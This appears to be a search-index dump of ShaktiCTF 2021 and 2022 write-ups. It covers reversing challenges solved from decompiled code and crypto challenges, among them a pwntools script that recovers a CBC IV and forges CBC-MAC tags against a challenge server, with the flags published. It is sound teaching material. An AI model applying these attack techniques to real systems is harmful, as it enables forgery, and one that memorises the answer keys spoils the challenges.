esolang","title":"Misc"},{"location":"ShaktiCTF21/pwn/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF21/reversing/Margaret/","text":"Author Simran Sandra Challenge Short Writeup The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver. Solver result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag) Flag shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Margaret"},{"location":"ShaktiCTF21/reversing/Margaret/#author","text":"Simran Sandra","title":"Author"},{"location":"ShaktiCTF21/reversing/Margaret/#challenge-short-writeup","text":"The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver.","title":"Challenge Short Writeup"},{"location":"ShaktiCTF21/reversing/Margaret/#solver","text":"result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag)","title":"Solver"},{"location":"ShaktiCTF21/reversing/Margaret/#flag","text":"shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Flag"},{"location":"ShaktiCTF21/reversing/bomb/","text":"BomB Challenge Author :bl4ck_Widw Points :200 Description flag format : shaktiCTF{S0m3_stR1nG} WriteUp This a basic C++ challenge which uses xoring to form the flag from the input .While running the program , we can see that the binary asks for a pin code. Going in deep into the program , we can see that there is a comparison of the input length with 9 . Further , when you move through the rest of the code , we can see that the input pin code gets xored with a string: '\\x10\\x13\\x17m\\x17\\x13\\x03' its output again gets xored with an array : [85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] This finally gives us the output, which if passes the constrains given, provides us with the flag . As the challenge discription tells us about the flag format , we can use it as a clue in solving our problem. As we know , the flag format is shaktiCTF{} . ShaktiCTF is a 9 letter long string just like our input . Hence we can use the flag format to reverse our program and find the pin . Solution script: d=\"shaktiCTF\" # The flag format can be used to find the pin code c=[85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] xored1 = [] for i in range(len(d)): xor=chr(ord(d[i%len(d)]) ^ c[i]) xored1.append(xor) a=[0x10, 0x13, 0x17, 0x6d, 0x17, 0x13, 0x3, 0x0,0x4b,0x3,0x1,0x2,0x5, 0x7] xored4 = [] print(\"PIN: \") for i in range(0,9): Output=chr(ord(xored1[i%len(xored1)]) ^ a[i]) xored4.append(Output) print(xored4) #pin :674332666 flag :shaktiCTF{TH3_BoMb_1$_D3AcTiV4t3D_gR34T_w0Rk!}","title":"BomB"},{"location":"ShaktiCTF21/reversing/bomb/#bomb","text":"","title":"BomB"},{"location":"ShaktiCTF21/reversing/bomb/#challenge-author-bl4ck_widw","text":"","title":"Challenge Author :bl4ck_Widw"},{"location":"ShaktiCTF21/reversing/bomb/#points-200","text":"","title":"Points :200"},{"location":"ShaktiCTF21/reversing/bomb/#description","text":"flag format : shaktiCTF{S0m3_stR1nG}","title":"Description"},{"location":"ShaktiCTF21/reversing/bomb/#writeup","text":"This a basic C++ challenge which uses xoring to form the flag from the input .While running the program , we can see that the binary asks for a pin code. Going in deep into the program , we can see that there is a comparison of the input length with 9 . Further , when you move through the rest of the code , we can see that the input pin code gets xored with a string: '\\x10\\x13\\x17m\\x17\\x13\\x03' its output again gets xored with an array : [85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] This finally gives us the output, which if passes the constrains given, provides us with the flag . As the challenge discription tells us about the flag format , we can use it as a clue in solving our problem. As we know , the flag format is shaktiCTF{} . ShaktiCTF is a 9 letter long string just like our input . Hence we can use the flag format to reverse our program and find the pin . Solution script: d=\"shaktiCTF\" # The flag format can be used to find the pin code c=[85, 76, 66, 53, 80, 72, 118, 98, 59, 78, 98, 126, 5, 107, 100, 75, 110, 60, 123, 16, 17, 105, 57, 6, 119, 85, 98, 93, 112, 16, 87, 109, 96, 126, 82, 100, 78, 1, 98, 105, 65, 4, 116, 79, 2, 35] xored1 = [] for i in range(len(d)): xor=chr(ord(d[i%len(d)]) ^ c[i]) xored1.append(xor) a=[0x10, 0x13, 0x17, 0x6d, 0x17, 0x13, 0x3, 0x0,0x4b,0x3,0x1,0x2,0x5, 0x7] xored4 = [] print(\"PIN: \") for i in range(0,9): Output=chr(ord(xored1[i%len(xored1)]) ^ a[i]) xored4.append(Output) print(xored4) #pin :674332666 flag :shaktiCTF{TH3_BoMb_1$_D3AcTiV4t3D_gR34T_w0Rk!}","title":"WriteUp"},{"location":"ShaktiCTF21/reversing/deceev/","text":"Deceev Challenge Writeup This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2] Flag shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#deceev","text":"","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#challenge-writeup","text":"This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2]","title":"Challenge Writeup"},{"location":"ShaktiCTF21/reversing/deceev/#flag","text":"shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Flag"},{"location":"ShaktiCTF21/reversing/fusk/","text":"Fusk Challenge Concept Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7) Flag flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#fusk","text":"","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#challenge-concept","text":"Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7)","title":"Challenge Concept"},{"location":"ShaktiCTF21/reversing/fusk/#flag","text":"flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Flag"},{"location":"ShaktiCTF21/reversing/hack/","text":"Hack Challenge Author: bl4ck_Widw Points : 50 Description Lets compare! Writeup This challenge is a fairly simple one but a bit tricky for beginners . The challenge emphasises on string compare . The input gets compared with a small part of an array already provided. The player just have to figure out which part gets compared with to find the flag. Solution script: #include<stdio.h> #include<string.h> #include<stdlib.h> int v2[30]={89,51,115,95,95,72,52,99,75,95,116,72,51,95,77,48,48,110,95,95,33,33,95,72}; int main(){ char v1[16]; int j; //shaktictf{__H4cK_tH3_M00n_} for(j=0;j<16;j++){ v1[j]=(char)v2[j+3]; } v1[j]='\\0'; printf(\"shaktictf{%s}\\n\",v1); } Flag:shaktictf{__H4cK_tH3_M00n_}","title":"Hack"},{"location":"ShaktiCTF21/reversing/hack/#hack","text":"","title":"Hack"},{"location":"ShaktiCTF21/reversing/hack/#challenge-author-bl4ck_widw","text":"","title":"Challenge Author: bl4ck_Widw"},{"location":"ShaktiCTF21/reversing/hack/#points-50","text":"","title":"Points : 50"},{"location":"ShaktiCTF21/reversing/hack/#description","text":"Lets compare!","title":"Description"},{"location":"ShaktiCTF21/reversing/hack/#writeup","text":"This challenge is a fairly simple one but a bit tricky for beginners . The challenge emphasises on string compare . The input gets compared with a small part of an array already provided. The player just have to figure out which part gets compared with to find the flag. Solution script: #include<stdio.h> #include<string.h> #include<stdlib.h> int v2[30]={89,51,115,95,95,72,52,99,75,95,116,72,51,95,77,48,48,110,95,95,33,33,95,72}; int main(){ char v1[16]; int j; //shaktictf{__H4cK_tH3_M00n_} for(j=0;j<16;j++){ v1[j]=(char)v2[j+3]; } v1[j]='\\0'; printf(\"shaktictf{%s}\\n\",v1); } Flag:shaktictf{__H4cK_tH3_M00n_}","title":"Writeup"},{"location":"ShaktiCTF21/reversing/intro/","text":"Reversing Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM BomB Medium bl4ck_Widw Xor Hack Easy bl4ck_Widw String compare pr0c3sses Medium imm0rt4l_5t4rk fork","title":"Reversing"},{"location":"ShaktiCTF21/reversing/intro/#reversing","text":"Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM BomB Medium bl4ck_Widw Xor Hack Easy bl4ck_Widw String compare pr0c3sses Medium imm0rt4l_5t4rk fork","title":"Reversing"},{"location":"ShaktiCTF21/reversing/process/","text":"pr0c3sses On running the challenge it requires to enter a string of length < 10. On opening up the binary we see a bunch of forks and compare statement with a string. The challenge is divided in two parts. The first part targets even indexes of the input and the second part targets the odd indexes. The goal is the choose such values from given switch cases as to get the string we get in the end to compare. Easiest and quickest way is to just create a fork tree. Total no. of processes = 2^(no. of times fork called) Let's take the first part. First check the no. of processes being called. This can be done by checking the no. of - in the compare statement, because each process on finishing is ended with a - . The no. of processes is 16. So we know the total no. of fork calls has to be 4. Looking in switch cases which prints out what is being compared later. Then make a fork tree. The parent is printed out last. Hence the last - in the compare statement is the parent. This is because of the wait(NULL) which makes the parent wait until all child processes are completed. Trace back the path to get the required inputs. Similarly do for the second part. Input given: 23144105 Flag: shaktictf{p4r3nt_ch1ld_Ch17d_wut?_0n3_m0r3!}","title":"pr0c3sses"},{"location":"ShaktiCTF21/reversing/process/#pr0c3sses","text":"On running the challenge it requires to enter a string of length < 10. On opening up the binary we see a bunch of forks and compare statement with a string. The challenge is divided in two parts. The first part targets even indexes of the input and the second part targets the odd indexes. The goal is the choose such values from given switch cases as to get the string we get in the end to compare. Easiest and quickest way is to just create a fork tree. Total no. of processes = 2^(no. of times fork called) Let's take the first part. First check the no. of processes being called. This can be done by checking the no. of - in the compare statement, because each process on finishing is ended with a - . The no. of processes is 16. So we know the total no. of fork calls has to be 4. Looking in switch cases which prints out what is being compared later. Then make a fork tree. The parent is printed out last. Hence the last - in the compare statement is the parent. This is because of the wait(NULL) which makes the parent wait until all child processes are completed. Trace back the path to get the required inputs. Similarly do for the second part. Input given: 23144105 Flag: shaktictf{p4r3nt_ch1ld_Ch17d_wut?_0n3_m0r3!}","title":"pr0c3sses"},{"location":"ShaktiCTF21/web/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF22/Readme/","text":"ShaktiCTF2022 Writeups Team Shakti organized ShaktiCTF this year on 9th and 10th December. This repository contains the Writeups of the challenges which were part of the CTF.","title":"Readme"},{"location":"ShaktiCTF22/Readme/#shaktictf2022-writeups","text":"Team Shakti organized ShaktiCTF this year on 9th and 10th December. This repository contains the Writeups of the challenges which were part of the CTF.","title":"ShaktiCTF2022 Writeups"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/","text":"Eazy_peaZy Challenge Description : Who knew encryption could be so simple? Difficulty Level Beginner Points 50 Flag format shaktictf{...} Author Rees Writeup This is the combination of base64 and shifting ```python! from base64 import b64decode x = 'ZFlSXGVaVGVXbFRjamFlIVAiZFBkZmEkY1BWUmtqampqampQWFQlJCNlYyYnWCVlYyYlbg==' x = b64decode(x) flag = '' for i in x: flag = flag + chr(i +15) ``` flag shaktictf{crypt0_1s_sup3r_eazyyyyyy_gc432tr56g4tr54}","title":"Eazy peaZy"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#eazy_peazy","text":"","title":"Eazy_peaZy"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#challenge-description","text":"Who knew encryption could be so simple?","title":"Challenge Description :"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#difficulty-level","text":"Beginner","title":"Difficulty Level"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#points","text":"50","title":"Points"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#flag-format","text":"shaktictf{...}","title":"Flag format"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#author","text":"Rees","title":"Author"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#writeup","text":"This is the combination of base64 and shifting ```python! from base64 import b64decode x = 'ZFlSXGVaVGVXbFRjamFlIVAiZFBkZmEkY1BWUmtqampqampQWFQlJCNlYyYnWCVlYyYlbg==' x = b64decode(x) flag = '' for i in x: flag = flag + chr(i +15) ```","title":"Writeup"},{"location":"ShaktiCTF22/crypto/Eazy_peaZy/#flag","text":"shaktictf{crypt0_1s_sup3r_eazyyyyyy_gc432tr56g4tr54}","title":"flag"},{"location":"ShaktiCTF22/crypto/cAex0r/","text":"cAex0r Challenge Description : I tried to develop a new generator but I am not sure how it is working. Difficulty Level Easy Author b4b7gr00t Points 100 Flag format shaktictf{...} Writeup This challenge is the combination of Ceaser cipher and xor. The number of letters to be shifted is given as a random number, and the key is also a random string with lenght 3 for xor. The idea is to use a Known Plaintext attack . You have cass function, which does Ceaser cipher encryption and ciphertext. Use the flag format shaktictf{ . Brute for the stride value within the range of 1 to 27. xor cass(b'sha',brute value) and ct[:3] to get the key. xor that key with ciphertext. check whether shaktictf{ is in cass(pt,brute value) . ```python= from itertools import product from pwn import xor ct = open(\"ciphertext.txt\",\"rb\").read() def cass (text,stride): u_alpha=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" l_alpha=\"abcdefghijklmnopqrstuvwxyz\" enc_text = \"\" for i in text: if i>=65 and i<= 90: enc_text += u_alpha[(u_alpha.find(chr(i)) + stride)%26] elif i>=97 and i<= 122: enc_text += l_alpha[(l_alpha.find(chr(i)) + stride)%26] else: enc_text += chr(i) return enc_text.encode() for i in range(1,27): key = xor(cass(b'sha', i),ct[:3]) pt = xor(ct,key) if b'shaktictf{' in cass(pt,-i): print(cass(pt,-i).decode()) ``` Flag shaktictf{welCom3_t0_cRyptOo_WoRLD_77846b12bfd9b91ebce67b236aa4}","title":"cAex0r"},{"location":"ShaktiCTF22/crypto/cAex0r/#caex0r","text":"","title":"cAex0r"},{"location":"ShaktiCTF22/crypto/cAex0r/#challenge-description","text":"I tried to develop a new generator but I am not sure how it is working.","title":"Challenge Description :"},{"location":"ShaktiCTF22/crypto/cAex0r/#difficulty-level","text":"Easy","title":"Difficulty Level"},{"location":"ShaktiCTF22/crypto/cAex0r/#author","text":"b4b7gr00t","title":"Author"},{"location":"ShaktiCTF22/crypto/cAex0r/#points","text":"100","title":"Points"},{"location":"ShaktiCTF22/crypto/cAex0r/#flag-format","text":"shaktictf{...}","title":"Flag format"},{"location":"ShaktiCTF22/crypto/cAex0r/#writeup","text":"This challenge is the combination of Ceaser cipher and xor. The number of letters to be shifted is given as a random number, and the key is also a random string with lenght 3 for xor. The idea is to use a Known Plaintext attack . You have cass function, which does Ceaser cipher encryption and ciphertext. Use the flag format shaktictf{ . Brute for the stride value within the range of 1 to 27. xor cass(b'sha',brute value) and ct[:3] to get the key. xor that key with ciphertext. check whether shaktictf{ is in cass(pt,brute value) . ```python= from itertools import product from pwn import xor ct = open(\"ciphertext.txt\",\"rb\").read() def cass (text,stride): u_alpha=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" l_alpha=\"abcdefghijklmnopqrstuvwxyz\" enc_text = \"\" for i in text: if i>=65 and i<= 90: enc_text += u_alpha[(u_alpha.find(chr(i)) + stride)%26] elif i>=97 and i<= 122: enc_text += l_alpha[(l_alpha.find(chr(i)) + stride)%26] else: enc_text += chr(i) return enc_text.encode() for i in range(1,27): key = xor(cass(b'sha', i),ct[:3]) pt = xor(ct,key) if b'shaktictf{' in cass(pt,-i): print(cass(pt,-i).decode()) ```","title":"Writeup"},{"location":"ShaktiCTF22/crypto/cAex0r/#flag","text":"shaktictf{welCom3_t0_cRyptOo_WoRLD_77846b12bfd9b91ebce67b236aa4}","title":"Flag"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/","text":"d0uble_cbc Challenge Description : My uncle has been working as a schoolteacher. One fine day, he decides to give chocolates to all his students. He brought a different types of chocolates. But two students are asking for the same kind of chocolate. All chocolates of that kind are completed except one. So, he decided to change the chocolate wrapper and give the same chocolate that he has.Can you help him to find that same chocolate wrapper? Difficulty Level Medium Author b4b7gr00t Points 200 Flag format shaktictf{...} Writeup This chall is combination of two iv detection in cbc mode and cbc mac vulnerability with non zero IV. Find iv using the oracle provided and use that iv as input for cbc mac oracle. iv detection can done by encrypting the pt='\\x00'*32 , decrypt ct = b\"\\x00\"*16+bytes.fromhex(ct)[:16] , decrypt the result again to get iv. ```python= from pwn import * from os import urandom host,port = '65.2.136.80',31351 io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('1') io.recvuntil(b'format\\n') pt = '\\x00'*32 io.sendline(pt.encode().hex()) io.recvline() ct = io.recvline() ct = ct[25:-1].decode() host,port = '0.0.0.0',4304 io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('2') io.recvuntil(b'decrypt') io.sendline(ct) io.recvline() pt = io.recvline()[28:-1] ct = b\"\\x00\"*16+bytes.fromhex(ct)[:16] io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('2') io.recvuntil(b'decrypt') io.sendline(ct.hex()) io.recvline() iv_dec = (bytes.fromhex(io.recvline()[28:-1].decode())[16:]).hex() 5. Now pass that iv to the sign function. It will return the tag as ct[16:]. ```python= io.recvuntil(b'4.exit') io.sendline('3') io.recvuntil(b'further') io.sendline(iv_dec) io.recvuntil(b'messages\\n') io.sendline('0') io.recvline() msg1 = urandom(16).hex() io.recvline() io.sendline(msg1) io.recvline() io.recvline() tag1 = (io.recvline().decode())[:-1] sign funtion is returning the last 16 bytes from ct . sign(sign(block0) xor block1) gives the same sign value. (So, simply append the ciphertext of the previous block) Flag shaktictf{double_cheese_double_mac_yummyyyy_4120686170707920636263206d6f6465}","title":"D0uble cbc"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#d0uble_cbc","text":"","title":"d0uble_cbc"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#challenge-description","text":"My uncle has been working as a schoolteacher. One fine day, he decides to give chocolates to all his students. He brought a different types of chocolates. But two students are asking for the same kind of chocolate. All chocolates of that kind are completed except one. So, he decided to change the chocolate wrapper and give the same chocolate that he has.Can you help him to find that same chocolate wrapper?","title":"Challenge Description :"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#difficulty-level","text":"Medium","title":"Difficulty Level"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#author","text":"b4b7gr00t","title":"Author"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#points","text":"200","title":"Points"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#flag-format","text":"shaktictf{...}","title":"Flag format"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#writeup","text":"This chall is combination of two iv detection in cbc mode and cbc mac vulnerability with non zero IV. Find iv using the oracle provided and use that iv as input for cbc mac oracle. iv detection can done by encrypting the pt='\\x00'*32 , decrypt ct = b\"\\x00\"*16+bytes.fromhex(ct)[:16] , decrypt the result again to get iv. ```python= from pwn import * from os import urandom host,port = '65.2.136.80',31351 io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('1') io.recvuntil(b'format\\n') pt = '\\x00'*32 io.sendline(pt.encode().hex()) io.recvline() ct = io.recvline() ct = ct[25:-1].decode()","title":"Writeup"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#hostport-00004304","text":"io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('2') io.recvuntil(b'decrypt') io.sendline(ct) io.recvline() pt = io.recvline()[28:-1] ct = b\"\\x00\"*16+bytes.fromhex(ct)[:16] io = remote(host,port) io.recvuntil(b'4.exit') io.sendline('2') io.recvuntil(b'decrypt') io.sendline(ct.hex()) io.recvline() iv_dec = (bytes.fromhex(io.recvline()[28:-1].decode())[16:]).hex() 5. Now pass that iv to the sign function. It will return the tag as ct[16:]. ```python= io.recvuntil(b'4.exit') io.sendline('3') io.recvuntil(b'further') io.sendline(iv_dec) io.recvuntil(b'messages\\n') io.sendline('0') io.recvline() msg1 = urandom(16).hex() io.recvline() io.sendline(msg1) io.recvline() 